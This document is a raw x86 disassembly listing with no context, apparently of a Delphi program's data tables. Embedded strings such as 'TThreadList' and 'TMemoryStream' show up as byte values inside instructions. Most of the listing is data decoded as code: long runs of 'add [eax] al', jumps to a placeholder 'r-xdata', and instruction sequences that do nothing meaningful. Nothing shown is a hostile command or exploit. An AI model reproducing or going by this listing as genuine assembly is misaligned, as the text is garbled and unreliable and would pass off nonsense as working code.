add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc0043a7
add [ eax ] al
add [ eax - 0x5a ] ah
outsd
jb r-xdata
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
cmpsb [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax - 0x40 ] ah
nop
cmpsd [ fs : esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
test al 0x43
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
add al 0xc0
insb
test al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
insb
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0xc0043 ] ah
add [ eax ] al
pushad
cmpsb [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ 0x72434645 ] cl
popad
je r-xdata
nop
nop
or [ edi + 0x43 ] ah
inc ebx
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xa8
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
cmpsd [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
inc esp
add [ eax * 2 + 0x65727453 ] cl
popad
insd
inc ebp
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
lodsb [ esi ]
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc0043 ] ch
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] ah
add [ eax + eax ] cl
add [ eax ] al
pushad
cmpsb [ esi ] [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0xc0043 ] bh
add [ eax ] al
pushad
add [ eax + eax * 8 ] al
outsd
jne r-xdata
add [ eax ] al
inc ebp
jb r-xdata
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
add [ eax + 0x55 ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
inc ebx
inc esp
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
rol [ eax + eax + 0x18 ] 0xc0
outsd
jne r-xdata
inc esp
add [ eax - 0x40 ] ah
sbb al al
aam 0xa9
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
test eax 0xc0043
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xa9
inc ebx
add [ eax + eax ] cl
nop
nop
nop
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx + 0xc0043 ] ch
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
nop
and [ ecx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
pop eax
push ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
test eax 0xc0043
add [ eax + eax ] cl
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 + 0x43 ] bh
add [ eax ] al
add [ eax + ebp * 4 + 0x43 ] ch
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
test al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffbb3e ] ah
retn 0x44
add [ eax - 0x40 ] ah
inc esp
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
stosb [ edi ]
inc ebx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x56 ] dh
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add ah al
jpo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
inc esp
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
sub al 0xaa
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 4 ] ch
inc ebx
add [ eax + eax ] cl
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax ] dl
inc ebp
push ebx
je r-xdata
inc esp
add [ eax - 0x40 ] ah
nop
nop
mov [ edx + 0x43 ] gs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0xc0043 ] gs
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xab
inc ebx
add [ eax ] dl
add [ eax ] al
add al cl
movsd [ edi ] [ esi ]
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x38 ] 0xc2
inc ebx
add [ esp + eax * 8 - 0x379fffbd ] ch
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0xaba49090
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
or [ ebx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
lodsb [ esi ]
inc ebx
add [ eax + eax ] ah
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x100043 ] dh
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
add [ eax + eax ] cl
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ecx ] dl
inc ebp
dec ecx
outsb
jbe r-xdata
arpl [ ebp + 0x73 ] sp
inc esp
stosd [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x43 ] al
add [ edx + eax * 8 - 0x3c87ffbd ] bh
inc ebx
add [ 0x73694c54 ] al
je r-xdata
insb
rol [ eax + eax - 0x3c ] 0x7b
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
stosd [ edi ]
inc ebx
outsd
jb r-xdata
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
stosb [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
sub_43ac4c
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x70 ] 0xca
inc ebx
add [ 0x74694254 ] al
jae r-xdata
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x24 ] 0xc8
inc ebx
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
lodsb [ esi ]
inc ebx
add [ eax + eax ] cl
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
nop
mov ah 0xac
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
lodsb [ esi ]
inc ebx
add dh cl
lodsb [ esi ]
inc ebx
add [ eax + eax ] al
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
sub_43acc5
push esp
into
inc ebx
add [ esi + ecx * 8 ] bh
inc ebx
add [ ebx ] cl
push esp
push eax
jb r-xdata
imul esi [ ebx + 0x74 ] 0x90746e65
nop
sub [ ebp + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 4 + 0x43 ] al
add [ edx - 0x53 ] dl
inc ebx
add [ eax + eax ] cl
add [ eax ] al
push 0x940043ac
retn 0x44
sub_43ad9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
scasb [ edi ]
inc ebx
add [ esi + ebp * 4 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x52 ] ah
inc ebx
add [ eax + eax ] cl
add [ eax ] al
push 0x940043ac
retn 0x44
sub_43ae98
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp + ebp * 4 + 0x43 ] ah
add [ eax ] cl
inc ebx
loope r-xdata
imul ebp [ esi + 0x67 ] 0xae749073
inc ebx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
inc ebx
add [ eax ] dl
into
inc ebx
add [ eax - 0x4fffbc2a ] ch
aad 0x43
add [ ebp + 0x43 ] ah
add [ eax - 0x33ffbc1b ] dh
in eax 0x43
add al ch
in eax 0x43
add al dh
fld [ ebx ]
int3
test al 0xd6
inc ebx
add [ eax + 0x640043d5 ] dh
in eax 0x43
outsb
jae r-xdata
jae r-xdata
add [ ecx + ebx * 8 - 0x1977ffbd ] dl
inc ebx
add al dl
add [ eax ] al
add [ eax ] cl
push esp
push ebx
je r-xdata
lodsd [ esi ]
inc ebx
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
or bl ch
inc ebx
add [ eax - 0x44 ] dl
inc esp
add [ eax - 0x44 ] dl
inc esp
add [ eax - 0x44 ] dl
inc esp
add [ edi ] al
push esp
push ebx
je r-xdata
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
scasd [ edi ]
inc ebx
add [ eax + eax ] al
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
add al dl
in al 0x43
add [ edx + ebp * 8 ] bl
inc ebx
add [ eax ] bh
0x540b0043 0x7453
out 0x43 eax
add [ eax - 0x18 ] al
inc ebx
add [ ecx + ebp * 8 + 0x43 ] bl
add [ eax + 0x43 ] cl
add [ ecx + ebp * 8 - 0x1dbbffbd ] bh
inc ebx
add [ esp + edx * 8 - 0x2b0fffbd ] bh
inc ebx
add [ eax ] cl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov al 0x43
add [ eax ] cl
add [ eax ] al
add ah bh
scasd [ edi ]
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x6c ] 0xee
inc ebx
add [ ebp + ebp * 8 + 0x43 ] dh
add al bl
in al dx
inc ebx
add [ eax ] dl
in eax dx
inc ebx
add [ eax - 0x13 ] cl
inc ebx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
sbb al 0xb1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 ] ch
inc ebx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x6bffbc51 ] bl
retn 0x44
popad
insd
dec eax
mov al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x50 ] bl
inc ebx
jecxz r-xdata
inc ebx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
push ebx
je r-xdata
add [ ebx + 0x43 ] dl
add ah ch
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 + 0x43 ] ah
add [ eax ] dh
add [ eax ] al
add [ eax - 0x6bffbc53 ] bl
retn 0x44
add [ eax + 0x43aee090 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 + 0x43 ] dh
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
jo r-xdata
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax ] cl
jmp r-xdata
imul ebp [ esi + 0x67 ] 0x7473694c
out 0x43 al
add [ eax ] cl
fadd [ ebx ]
fadd [ fs : ebx ]
sbb ch bl
inc ebx
add al bl
fiadd [ ebx ]
cmp bh bl
inc ebx
add ah dh
fild [ ebx ]
mov al 0xe2
inc ebx
add ah bl
loop r-xdata
inc ebx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc esp
add [ eax - 0x5bffbb3e ] ah
retn 0x44
add [ eax ] cl
add [ eax ] al
add [ eax - 0x6bffbc51 ] bl
retn 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
mov al 0x43
jae r-xdata
add [ eax - 0x501b6f70 ] dl
sub_43aecc
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x38 ] 0xe1
inc ebx
add [ eax ] dl
into
inc ebx
add [ eax - 0x4fffbc2a ] ch
aad 0x43
add [ ebp + 0x43 ] ah
add [ eax - 0x33ffbc1b ] dh
in eax 0x43
add al ch
in eax 0x43
add al dh
fld [ ebx ]
int3
sub_43b108
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax ] cl
jmp r-xdata
inc ebx
add [ eax + eax ] dl
add [ eax ] al
shl [ eax - 0x3d6bffbd ] 0x1
inc esp
add [ eax - 0x5bffbb3e ] ah
retn 0x44
sub_43b18e
inc ebx
add ah cl
out dx al
inc ebx
add [ eax ] ch
int1
inc ebx
add [ edi + ebp * 8 ] bh
inc ebx
add [ eax - 0x10 ] dh
inc ebx
add [ 0x6d654d54 ] cl
outsd
jb r-xdata
in al dx
push ebx
je r-xdata
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
add [ esp + 0x4 ] 0xffffffec
popad
insd
nop
nop
cld
mov cl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] cl
inc ebx
add [ eax ] bl
add [ eax ] al
add al dl
mov al 0x43
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x14 ] 0xf3
inc ebx
add [ eax ] cl
jmp r-xdata
mov eax [ eax ]
jmp [ eax + 0x10 ]
sub_43b370
sub al 0xe4
inc esp
add [ eax ] bl
rol [ eax + eax + 0x34 ] 0x31
inc esp
add [ ecx + esi + 0x32000044 ] al
inc esp
add [ edx + esi + 0x44 ] bh
add [ eax ] cl
xor eax [ eax + eax + 0x78 ]
xor eax [ eax + eax + 0x7c ]
xor eax 0x35900044
inc esp
add [ ebp + esi + 0x35b80044 ] ah
inc esp
add ah cl
xor eax 0x366c0044
inc esp
add [ esi ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x43b4 ] dl
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x780043b4 ] ah
add [ eax ] al
add [ eax - 0x6bffbc4d ] bh
retn 0x44
mov ah 0x43
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xb3
inc ebx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x6bffbb5a ] bh
retn 0x44
add al 0xb4
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 ] dl
inc ebx
add [ eax ] ch
add [ eax ] al
add al cl
movsd [ edi ] [ esi ]
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x18 ] 0xf3
inc ebx
add [ eax ] ch
hlt
sub_43b4f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
outsb
outsb
je r-xdata
inc ebx
add al dh
mov ch 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x21ffbc4b ] al
popad
insd
les esi [ gs : ebx + eax * 2 + 0x490f0f00 ]
inc esp
jae r-xdata
add al 0xc0
inc esp
add [ eax ] bl
rol [ eax + eax + 0x5c ] 0x21
inc esp
add [ eax ] dl
outsb
jb r-xdata
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
inc ebx
add [ esp + ebp ] bh
inc esp
outsd
je r-xdata
into
inc ebx
add [ eax ] dl
inc esp
add [ ecx * 8 + 0x27b00043 ] cl
inc esp
add [ eax - 0x3bffbbdb ] ah
daa
inc esp
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
daa
inc esp
pop esp
and [ eax + eax + 0x10 ] eax
jns r-xdata
mov ch 0x43
add [ eax + eax ] ah
add [ eax ] al
push 0x3c0043ac
sub al 0x44
inc ebx
add dh bl
cmpsb [ esi ] [ edi ]
inc esp
add [ ecx ] al
pop es
call 0xffffffffe3ea6e51
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
add al ah
daa
inc esp
add [ esp + ebp + 0x21000044 ] bl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + esi * 4 + 0x80043 ] ch
add [ eax ] al
jae r-xdata
add [ eax - 0x4b ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4b ] dh
sub_43b5ed
mov ch 0x43
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x140043 ] bh
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
nop
nop
nop
pushfd
mov dh 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ch 0x43
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax - 0x5bffbb3e ] ah
retn 0x44
jae r-xdata
mov ah 0x43
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
popad
insd
mov [ gs : ebp + 0xc0044 ] ah
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ esp + esi * 4 + 0x80043 ] ch
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
sub_43b688
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x4c ] 0x2d
inc esp
add [ ebp + 0x2d940044 ] bh
inc esp
add [ esi + ebp ] ch
inc esp
add al ah
sub eax 0x2e400044
inc esp
add ah ch
sub al 0x44
add [ ebp + ebp + 0x2e4c0044 ] bh
inc esp
add [ eax ] dl
push esp
inc edx
popad
jae r-xdata
add [ eax - 0x3bffbbdb ] ah
daa
arpl [ ecx + 0x63 ] ax
je r-xdata
inc esp
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp + 0x2e6c0044 ] bl
